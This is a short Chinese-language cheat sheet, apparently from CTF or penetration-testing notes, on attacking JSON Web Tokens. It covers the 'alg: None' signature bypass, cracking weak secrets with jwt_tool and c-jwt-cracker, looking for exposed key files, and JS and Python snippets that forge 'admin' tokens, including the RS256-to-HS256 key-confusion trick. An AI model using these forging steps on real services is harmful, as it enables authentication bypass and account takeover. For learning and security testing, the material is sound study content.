# JWT(JSON Web Tokens)

在线工具：[JSON Web Tokens - jwt.io](https://jwt.io/)

本地工具：[[GitHub - ticarpi/jwt_tool: :snake: A toolkit for testing, tweaking and cracking JSON Web Tokens](https://github.com/ticarpi/jwt_tool)](https://github.com/ticarpi/jwt_tool)

三个部分组成
- Header
- Payload
- Signature
形式：xxxxx.yyyyy.zzzzz

```
HEADER:ALGORITHM & TOKEN TYPE
{
  "alg": "None",
  "typ": "jwt"
}

PAYLOAD:DATA
[
  {
    "iss": "admin",
    "iat": 1689410770,
    "exp": 1689417970,
    "nbf": 1689410770,
    "sub": "user",
    "jti": "f9bb22e3f645b6d8cd37307ff1349306"
  }
]

VERIFY SIGNATURE

签名一般会变
```

## 无签名认证时，可以先调为HS256加密算法进行JWT
```

当有签名时，可将 Header 中的加密算法改为 None（JWT 支持将算法设定为 “None”。如果“alg” 字段设为“ None”，那么签名会被置空，这样任何 token 都是有效的）

改payload为:header + '.' + payload + '.'（注意最后的点）

直接用base64改即可
```

## 弱密码利用工具爆破获得密钥 
```
c-jwt-cracker

./jwtcrack xxx


jwt_tool.py

python3 jwt_tool.py xxx -C -d jwt-common.txt
```

```
RS256 是使用 RSA 私钥进行签名，使用 RSA 公钥进行验证,
HS256 使用同一个「secret_key」进行签名与验证（对称加密）
ES256 和 RS256 一样，都使用私钥签名，公钥验证

可以尝试浏览器目录是否有public.key 和 private.key
```

## 当知道私钥时，可以通过RS2565构造jwt
```
js脚本
const jwt = require('jsonwebtoken');
var fs = require('fs');
var privateKey = fs.readFileSync('private.key');
var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'RS256' });
console.log(token)

python脚本：
import jwt  
public = open('private.key', 'r').read()  
payload={"user":"admin"}  
print(jwt.encode(payload, key=public, algorithm='RS256'))
# 需安装pyjwt库
```

## 当只知道公钥时

```
可以通过HS256构造jwt（如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名）

js脚本
const jwt = require('jsonwebtoken');
var fs = require('fs');
var privateKey = fs.readFileSync('public.key');
var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' });
console.log(token)
```
